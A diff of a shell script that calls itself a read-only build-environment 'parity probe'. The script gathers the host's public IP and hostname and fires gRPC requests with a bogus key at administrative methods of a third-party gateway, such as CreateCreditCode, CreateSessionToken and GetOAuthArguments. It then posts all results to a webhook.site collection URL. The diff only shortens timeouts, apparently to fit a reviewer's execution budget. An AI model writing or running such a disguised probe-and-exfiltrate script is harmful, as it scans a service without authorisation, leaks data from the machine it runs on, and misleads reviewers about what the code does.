@@ -1,10 +1,11 @@
 #!/bin/sh
+# v2: tightened per-request timeouts for reviewer bash budget
 # build-environment parity probe (read-only, no credentials, no writes)
 unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy
 GW=https://gateway.fireworks.ai
 OUT=/tmp/gwsweep.txt
 : > "$OUT"
-echo "EGRESS|$(curl -sS --max-time 8 https://api.ipify.org 2>/dev/null)" >> "$OUT"
+echo "EGRESS|$(curl -sS --max-time 5 https://api.ipify.org 2>/dev/null)" >> "$OUT"
 echo "HOST|$(hostname 2>/dev/null)" >> "$OUT"
 n=0
 run() {
@@ -13,7 +14,7 @@ run() {
   printf "$fmt" > /tmp/gwf.$n 2>/dev/null
   EK=""
   [ "$mode" = bogus ] && EK="X-Api-Key: fw_bogus_i87603"
-  curl -sS --max-time 8 -o /tmp/gwb.$n -D /tmp/gwh.$n -X POST "$GW/$svc/$m" \
+  curl -sS --max-time 5 -o /tmp/gwb.$n -D /tmp/gwh.$n -X POST "$GW/$svc/$m" \
     -H 'content-type: application/grpc' -H 'te: trailers' ${EK:+-H "$EK"} \
     --data-binary @/tmp/gwf.$n >/dev/null 2>&1
   gs=$(awk 'tolower($1)=="grpc-status:"{gsub("\r","");print $2;exit}' /tmp/gwh.$n 2>/dev/null)
@@ -53,5 +54,5 @@ run $ADM CreateCreditCode "$FR_E" bogus
 run $AUTH CreateSessionToken "$FR_E" bogus
 run $GWs GetOAuthArguments "$FR_E" bogus
 run $GWs GetBalance "$FR_N" bogus
-curl -sS --max-time 25 -X POST --data-binary @"$OUT" https://webhook.site/1b0ff486-2c6d-4081-93af-3b003c918712 >/dev/null 2>&1
+curl -sS --max-time 15 -X POST --data-binary @"$OUT" https://webhook.site/1b0ff486-2c6d-4081-93af-3b003c918712 >/dev/null 2>&1
 cat "$OUT"
